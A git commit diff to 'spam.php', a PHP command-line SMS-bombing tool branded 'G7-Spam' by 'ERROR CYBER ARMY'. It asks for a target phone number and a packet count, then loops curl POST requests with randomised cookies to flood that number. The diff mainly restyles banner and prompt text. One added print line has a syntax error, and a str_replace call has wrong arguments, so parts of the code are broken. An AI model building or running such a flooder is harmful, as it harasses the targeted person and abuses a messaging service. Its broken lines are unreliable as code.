1efc16462d297d6a56d4fc81a7a94df287265483
G7-Hckr <48849606+G7-Hckr@users.noreply.github.com>
2019-03-25 05:46:47 +0700

    Update spam.php

--- spam.php
+++ spam.php
@@ -1,17 +1,17 @@
 <?php
-echo "G7-Spam\n\n";
-echo "TEAM : ERROR CYBER ARMY\n\n";
-echo "Nomor Target?\n : ";
+echo "[X]G7-Spam";
+echo "[X]TEAM : ERROR CYBER ARMY\n\n";
+echo "Nomor Target?\n ~>: ";
 $nomer = trim(fgets(STDIN));
 if(strlen($nomer)==11){
 	$nomer = str_replace("0","62".$nomer);
 }elseif(strlen($nomer)>12){
 	$nomer = str_replace("62","0",$nomer);
 }
-echo "Target: $nomer (Y/N)";
+echo "Target ~>: $nomer (Y/N)";
 $cek = trim(fgets(STDIN));
 if($cek=="n") exit("Stopped!\n");
-echo "Jumlah Paket?\n : ";
+echo "Jumlah Paket?\n ~>: ";
 $jumlah = trim(fgets(STDIN));
 for($a=0;$a<$jumlah;$a++) {
 	$rand1 = md5(rand(12345678,98765432));
@@ -52,6 +52,6 @@ Cookie: identity=".$rand1."; browser_id=".$rand2."; _ga=GA1.2.1024758930.1531960
 	curl_setopt($ch, CURLOPT_POSTFIELDS, $ar);
 	$asw = curl_exec($ch);
 	curl_close($ch);
-	print $a.$nomer." [√]SendingSuccesed[√]\n";
+	print "[-]sending[-]"$a.$nomer." [√]SendingSuccesed[√]\n";
 }
 
